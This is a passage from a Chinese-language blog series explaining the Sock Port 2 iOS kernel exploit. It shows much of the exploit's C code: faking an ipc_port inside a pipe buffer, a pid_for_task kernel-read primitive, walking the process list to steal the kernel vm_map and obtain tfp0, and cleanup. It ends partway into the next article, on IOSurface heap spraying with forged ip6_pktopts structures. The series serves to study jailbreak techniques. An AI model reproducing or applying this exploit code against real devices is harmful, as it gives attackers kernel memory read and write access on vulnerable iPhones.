&#123;</span><br><span class="line">    <span class="comment">// align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)</span></span><br><span class="line">    fakeport-&gt;ip_kobject = port_pipe_buffer + <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    fakeport-&gt;ip_kobject = (<span class="keyword">uint64_t</span>)fake_task;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 SMAP 下，内核中引用的地址不能来自 userland，因此上述关键代码底部的 task 指向的是 Pipe Buffer 中的空间。</p>
<h2 id="偷梁换柱"><a href="#偷梁换柱" class="headerlink" title="偷梁换柱"></a>偷梁换柱</h2><p>接下来我们用 fake port 去替换 Pipe Buffer 中的第一个合法 port：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="comment">// spraying worked, now the pipe buffer is filled with pointers to our target port</span></span><br><span class="line">    <span class="comment">// overwrite the first pointer with our second pipe buffer, which contains the fake port</span></span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;port_pipe_buffer, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">write</span>(fds[<span class="number">1</span>], &amp;fakeport, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样注意，在 SMAP 模式下应当写入 <code>port_pipe_buffer</code> 的地址而不是 userland 的 fakeport 地址。此时我们已经将 fakeport 放到了合法的 port 区域，换句话说我们完全控制了一个 <code>ipc_port</code>。</p>
<h1 id="接收-Mach-OOL-Message"><a href="#接收-Mach-OOL-Message" class="headerlink" title="接收 Mach OOL Message"></a>接收 Mach OOL Message</h1><p>由于 port 句柄包含了 rights 信息，我们的篡改会改变 Pipe Buffer 中第一个 port 的句柄，因此我们需要接收 OOL Message 来重新读到这个句柄，还记得之前记录下的 remote port 吗，我们可以通过它接收发送的 OOL Message：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ool_msg</span> *<span class="title">msg</span> = <span class="title">malloc</span>(0<span class="title">x1000</span>);</span></span><br><span class="line">ret = mach_msg(&amp;msg-&gt;hdr, MACH_RCV_MSG, <span class="number">0</span>, <span class="number">0x1000</span>, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] mach_msg() failed: %d (%s)\n"</span>, ret, mach_error_string(ret));</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> *received_ports = msg-&gt;ool_ports.address;</span><br><span class="line"><span class="keyword">mach_port_t</span> our_port = received_ports[<span class="number">0</span>]; <span class="comment">// fake port!</span></span><br><span class="line"><span class="built_in">free</span>(msg);</span><br></pre></td></tr></table></figure>

<p>这里我们能拿到 fakeport 对应的 port 句柄，而不再是之前的 target port 句柄，这是因为内核在将 OOL Message 拷贝回用户空间时，会执行 <code>CAST_MACH_PORT_TO_NAME</code> 宏函数进行转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAST_MACH_PORT_TO_NAME(x) ((mach_port_name_t)(uintptr_t)(x))</span></span><br></pre></td></tr></table></figure>

<p>它会截取 <code>ipc_port</code> 的头部 <code>ipc_object</code> 的 8B，即 <code>ipc_object</code> 中的前两个成员：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> &#123;</span></span><br><span class="line">    <span class="keyword">ipc_object_bits_t</span> io_bits; <span class="comment">// 4B</span></span><br><span class="line">    <span class="keyword">ipc_object_refs_t</span> io_references; <span class="comment">// 4B</span></span><br><span class="line">    <span class="keyword">lck_spin_t</span>	io_lock_data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>因此最终 port 句柄实际上是由 <code>ipc_port</code> 中的 <code>io_bits</code> 和 <code>io_references</code> 的值组成的。</p>
<p>现在我们同时拥有了 <code>ipc_port</code> 的完全控制权及其句柄，但这个 <code>ipc_port</code> 缺少 <code>vm_map</code>，并不是一个合法的 task port，接下来我们需要将内核的 <code>vm_map</code> 赋予它。</p>
<h1 id="pid-for-task-Kernel-Read-Primitive"><a href="#pid-for-task-Kernel-Read-Primitive" class="headerlink" title="pid_for_task Kernel Read Primitive"></a>pid_for_task Kernel Read Primitive</h1><p><code>pid_for_task</code> 函数接收一个进程的 port 作为参数，并查询它的 pid 返回，它的实现原理如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="keyword">int</span> pid = get_ipc_port(port)-&gt;task-&gt;bsd_info-&gt;p_pid;</span><br></pre></td></tr></table></figure>
<p>而结构体成员访问的本质是偏移量计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = *(*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) + offset_pid)</span><br></pre></td></tr></table></figure>
<p>由于我们有 fakeport 的控制权，我们可以修改它的 <code>bsd_info</code> 等于 <code>addr - offset_pid</code>，此时 <code>*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) = addr - offset_pid</code>，此时上述公式有如下的等价表达：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = *(addr - offset_pid + offset_pid) = *addr</span><br></pre></td></tr></table></figure>
<p>通过这种方式能稳定读取 addr 处的 4B 数据，进而实现一个完美的 Kernel Read Primitive：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kr32(addr, value)\</span></span><br><span class="line">    <span class="keyword">if</span> (SMAP) &#123;\</span><br><span class="line">        <span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);\</span><br><span class="line">    &#125;\</span><br><span class="line">    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\</span><br><span class="line">    <span class="keyword">if</span> (SMAP) &#123;\</span><br><span class="line">        <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);\</span><br><span class="line">    &#125;\</span><br><span class="line">    value = <span class="number">0x0</span>;\</span><br><span class="line">    ret = pid_for_task(our_port, (<span class="keyword">int</span> *)&amp;value);</span><br></pre></td></tr></table></figure>
<p>首先通过 Pipe Buffer 修改 <code>bsd_info</code>，然后将 fakeport 的句柄传入 <code>pid_for_task</code>，即可读取到指定地址的 4B 数据。</p>
<p>通过组合多次 kr32 可以实现任意长度数据的 Kernel Read，例如下面的 kr64：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kr64(addr, value)\</span></span><br><span class="line">    kr32(addr + <span class="number">0x4</span>, read64_tmp);\</span><br><span class="line">    kr32(addr, value);\</span><br><span class="line">    value = value | ((<span class="keyword">uint64_t</span>)read64_tmp &lt;&lt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<h1 id="获取-kernel-vm-map"><a href="#获取-kernel-vm-map" class="headerlink" title="获取 kernel vm_map"></a>获取 kernel vm_map</h1><p>基于当前进程的 <code>task_port</code> 可以枚举出所有进程，在这个过程中需要数百次的 Kernel Read，因此需要借助于上述稳定的 <code>pid_for_task Kernel Read Primitive</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> struct_task;</span><br><span class="line">kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);</span><br><span class="line"><span class="keyword">if</span> (!struct_task) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] READING VIA FAKE PORT WORKED? 0x%llx\n"</span>, struct_task);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] Let's steal that kernel task port!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// tfp0!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_vm_map = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (struct_task != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> bsd_info;</span><br><span class="line">    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);</span><br><span class="line">    <span class="keyword">if</span> (!bsd_info) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> pid;</span><br><span class="line">    kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> vm_map;</span><br><span class="line">        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);</span><br><span class="line">        <span class="keyword">if</span> (!vm_map) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        kernel_vm_map = vm_map;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 <code>proc</code> 是一个双向链表，我们可以从当前进程开始向前枚举，直至 pid=0，再从 kernel task 中取出 <code>vm_map</code>。</p>
<h1 id="第一个-tfp0"><a href="#第一个-tfp0" class="headerlink" title="第一个 tfp0"></a>第一个 tfp0</h1><p>将上述获取到的 <code>kernel vm_map</code> 写入 fakeport，现在我们有了一个合法的 <code>kernel task port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">    </span><br><span class="line">fake_task-&gt;lock.data = <span class="number">0x0</span>;</span><br><span class="line">fake_task-&gt;lock.type = <span class="number">0x22</span>;</span><br><span class="line">fake_task-&gt;ref_count = <span class="number">100</span>;</span><br><span class="line">fake_task-&gt;active = <span class="number">1</span>;</span><br><span class="line">fake_task-&gt;<span class="built_in">map</span> = kernel_vm_map;</span><br><span class="line">*(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint64_t</span>)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们应该已经拥有一个 tfp0 port，可以借助于 mach_vm 相关的内存函数予以验证。</p>
<h1 id="稳定的-tfp0"><a href="#稳定的-tfp0" class="headerlink" title="稳定的 tfp0"></a>稳定的 tfp0</h1><p>上述 tfp0 是一个偷梁换柱而来的 task port，可能会埋下一些隐患。接下来我们可以用 tfp0 去创建一个合法、稳定、安全的 tfp0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> new_tfp0 = new_port();</span><br><span class="line"><span class="keyword">if</span> (!new_tfp0) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to allocate new tfp0 port\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> new_addr = find_port(new_tfp0, self_port_addr);</span><br><span class="line"><span class="keyword">if</span> (!new_addr) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to find new tfp0 port address\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> faketask = kalloc(<span class="number">0x600</span>);</span><br><span class="line"><span class="keyword">if</span> (!faketask) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to kalloc faketask\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kwrite(faketask, fake_task, <span class="number">0x600</span>);</span><br><span class="line">fakeport-&gt;ip_kobject = faketask;</span><br><span class="line"></span><br><span class="line">kwrite(new_addr, (<span class="keyword">const</span> <span class="keyword">void</span>*)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>));</span><br></pre></td></tr></table></figure>
<p>这里先创建了一个具有 send rights 的 port，然后重新创建了一个区域来容纳 kernel task，这消除了之前 <code>ipc_port</code> 与 task 在 Port Pipe Buffer 中相邻从而带来的隐患。随后将 Port Pipe Buffer 中的 task 拷贝到新分配的 task 区域，再将 fakeport 数据完整拷贝到新创建的 port，由此我们得到了一个新的 tfp0。</p>
<h1 id="环境清理"><a href="#环境清理" class="headerlink" title="环境清理"></a>环境清理</h1><p>接下来我们将先前的 tfp0 port 从进程的 port 索引表中抹去，再将已释放的 Pipe Buffer 从 fd 索引表中抹去，最后关闭 IOSurfaceClient 与 pipe，释放 userland 临时分配的缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clean up port</span></span><br><span class="line"><span class="keyword">uint64_t</span> task_addr = rk64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line"><span class="keyword">uint64_t</span> itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));</span><br><span class="line"><span class="keyword">uint64_t</span> is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> port_index = our_port &gt;&gt; <span class="number">8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> <span class="keyword">sizeof_ipc_entry_t</span> = <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">wk32(is_table + (port_index * <span class="keyword">sizeof_ipc_entry_t</span>) + <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">wk64(is_table + (port_index * <span class="keyword">sizeof_ipc_entry_t</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">wk64(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), <span class="number">0</span>); <span class="comment">// freed already via mach_msg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fds[<span class="number">0</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (fds[<span class="number">1</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (port_fds[<span class="number">0</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(port_fds[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (port_fds[<span class="number">1</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(port_fds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)fakeport);</span><br><span class="line">deinit_IOSurface();</span><br></pre></td></tr></table></figure>
<p>到这里整个 Sock Port 利用就分析完了，我们拿到了稳定的 tfp0，距离 Jailbreak 又近了一步。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文梳理了 Sock Port 2 获得 tfp0 的整个过程，并对关键步骤进行了讲解，通过阅读本文能够对 Sock Port 在整体和细节上分别有深入的认识。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>到这里 Sock Port 漏洞解析就告一段落了，通过这个 Exploit 我们仅仅取得了 tfp0，距离 Jailbreak 还有很远的距离。接下来的文章将开始分析讲解 Undecimus Jailbreak 源码，讲解从 tfp0 到内核代码执行，再到各种 Kernel Patch。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention" target="_blank" rel="noopener">Supervisor Mode Access Prevention. Wikipedia</a></li>
<li><a href="https://www.geeksforgeeks.org/pipe-system-call/" target="_blank" rel="noopener">Pipe System Call. GeeksforGeeks</a></li>
<li><a href="https://github.com/jakeajames/sock_port" target="_blank" rel="noopener">Sock Port 2. jakeajames</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/">Sock Port 漏洞解析（三）IOSurface Heap Spraying</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-12-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SockPort/">SockPort</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/UAF/">UAF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Heap-Spraying/">Heap Spraying</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/IOSurface/">IOSurface</a></span><div class="content"><h1 id="系列文章"><a href="#系列文章" class="headerlink" title="系列文章"></a>系列文章</h1><ol>
<li><a href="https://juejin.im/post/5dd10660e51d453fac0a598d" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（一）UAF 与 Heap Spraying</a></li>
<li><a href="https://juejin.im/post/5dd918d051882573180a2ba7" target="_blank" rel="noopener">iOS Jailbreak Principles - Sock Port 漏洞解析（二）通过 Mach OOL Message 泄露 Port Address</a></li>
</ol>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上一篇文章中，我们介绍了基于 OOL Message 的 Port Address Spraying，这种 Spraying 的局限性很大，只能对已释放区域填充 Port Address。实现 tfp0 的一个关键点是在已释放区域填充任意数据，这就需要我们寻找其他函数作为 Heap Spraying 的工具。</p>
<p>本文将介绍一种基于 IOSurface 的 Heap Spraying 方法，通过该方法能够实现将任意数据喷射到内核指定位置。</p>
<h1 id="IOSurface-是什么"><a href="#IOSurface-是什么" class="headerlink" title="IOSurface 是什么"></a>IOSurface 是什么</h1><p>根据苹果的文档[1]，IOSurface Framework 的功能如下：</p>
<blockquote>
<p>The IOSurface framework provides a framebuffer object suitable for sharing across process boundaries. It is commonly used to allow applications to move complex image decompression and draw logic into a separate process to enhance security.</p>
</blockquote>
<p>即 IOSurface.framework 提供了一个跨进程共享的帧缓冲区，它常常用于把复杂的图片解码与绘制逻辑分离到单独的进程以提高安全性。</p>
<p>了解了 IOSurface.framework，接下来根据 iPhone Dev Wiki 给出的描述[2]：</p>
<blockquote>
<p>IOSurface is an object encompassing a kernel-managed rectangular pixel buffer in the IOSurface framework. It is a thin wrapper on top of an IOSurfaceClient object which actually interfaces with the kernel.</p>
</blockquote>
<p>从这段描述我们可以提取出有效信息：IOSurface 是一个被内核管理的对象，它是在 IOSurfaceClient 之上的一个封装，既然这个对象被分配到内核的内存区域，我们就有机会利用它实现 Kernel Heap Spraying。</p>
<h1 id="IOSurface-Heap-Spraying-使用场景"><a href="#IOSurface-Heap-Spraying-使用场景" class="headerlink" title="IOSurface Heap Spraying 使用场景"></a>IOSurface Heap Spraying 使用场景</h1><p>在<a href="https://juejin.im/post/5dd918d051882573180a2ba7#heading-7" target="_blank" rel="noopener">上一篇文章</a> 的 Sock Port 概览中我们提到可借助 <code>in6p_outputopts</code> 成员实现不稳定的内核内存读取和释放，其实现原理是先伪造一个 <code>in6p_outputopts</code> 结构体，利用 minmtu 成员作为标志位，再额外利用一个结构体指针 <code>in6_pktinfo</code> 赋予我们想要读取的地址，如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a fake struct with our dangling port address as its pktinfo</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip6_pktopts</span> *<span class="title">fake_opts</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ip6_pktopts</span>));</span></span><br><span class="line"><span class="comment">// give a number we can recognize</span></span><br><span class="line">fake_opts-&gt;ip6po_minmtu = <span class="number">0x41424344</span>; </span><br><span class="line"><span class="comment">// on iOS 10, minmtu offset is different</span></span><br><span class="line">*(<span class="keyword">uint32_t</span>*)((<span class="keyword">uint64_t</span>)fake_opts + <span class="number">164</span>) = <span class="number">0x41424344</span>;</span><br><span class="line"><span class="comment">// address to read</span></span><br><span class="line">fake_opts-&gt;ip6po_pktinfo = (struct in6_pktinfo*)addr;</span><br></pre></td></tr></table></figure>

<p>然后我们利用 Socket UAF 制造大量的已释放 <code>in6p_outputopts</code> 区域，随后将上述伪造的数据喷射到 Socket UAF 区域，通过 getsockopt 函数读取 minmtu 确认 Spraying 成功，成功后再通过 getsockopt 读取 <code>ip6po_pktinfo</code> 结构体，由于 <code>ip6po_pktinfo</code> 的大小为 20B，我们通过这种方式一次性可以读取目标地址的 20B 数据。</p>
<p>不难看出，上述问题的关键在于如何实现 <code>faked in6p_outputopts</code> 的 Spraying，而 IOSurface 能够向内核的帧缓冲区发送任意数据，因此非常适合这个场景。</p>
<h1 id="IOSurface-Heap-Spraying-详解"><a href="#IOSurface-Heap-Spraying-详解" class="headerlink" title="IOSurface Heap Spraying 详解"></a>IOSurface Heap Spraying 详解</h1><p>首先我们看到 Sock Port 2 提供的 IOSurface 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_IOSurface</span><span class="params">(<span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !IOSurface_spray_with_gc(<span class="number">32</span>, <span class="number">256</span>, data, (<span class="keyword">uint32_t</span>)<span class="built_in">size</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span></span><br><span class="line">IOSurface_spray_with_gc(<span class="keyword">uint32_t</span> array_count, <span class="keyword">uint32_t</span> array_length,</span><br><span class="line">		<span class="keyword">void</span> *data, <span class="keyword">uint32_t</span> data_size,</span><br><span class="line">		<span class="keyword">void</span> (^callback)(<span class="keyword">uint32_t</span> array_id, <span class="keyword">uint32_t</span> data_id, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> <span class="built_in">size</span>)) &#123;</span><br><span class="line">	<span class="keyword">return</span> IOSurface_spray_with_gc_internal(array_count, array_length, <span class="number">0</span>,</span><br><span class="line">			data, data_size, callback);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 Facade 函数为 <code>spray_IOSurface</code>，只需要提供待 Spraying 的数据和大小即可，它是 <code>IOSurface_spray_with_gc</code> 的简单封装，提供了对生成的 OSArray 的默认配置，<code>array_count = 32</code> 代表生成 32 个 Spraying Array，即进行 32 次 Heap Spraying，而 <code>array_length = 256</code> 代表每个数组中包含了 256 个 Spraying Data。</p>
<h2 id="XML-构造"><a href="#XML-构造" class="headerlink" title="XML 构造"></a>XML 构造</h2><p>在 <code>IOSurface_spray_with_gc_internal</code> 函数中，首先完成的是 OSSerializeBinary XML 的构造：</p>
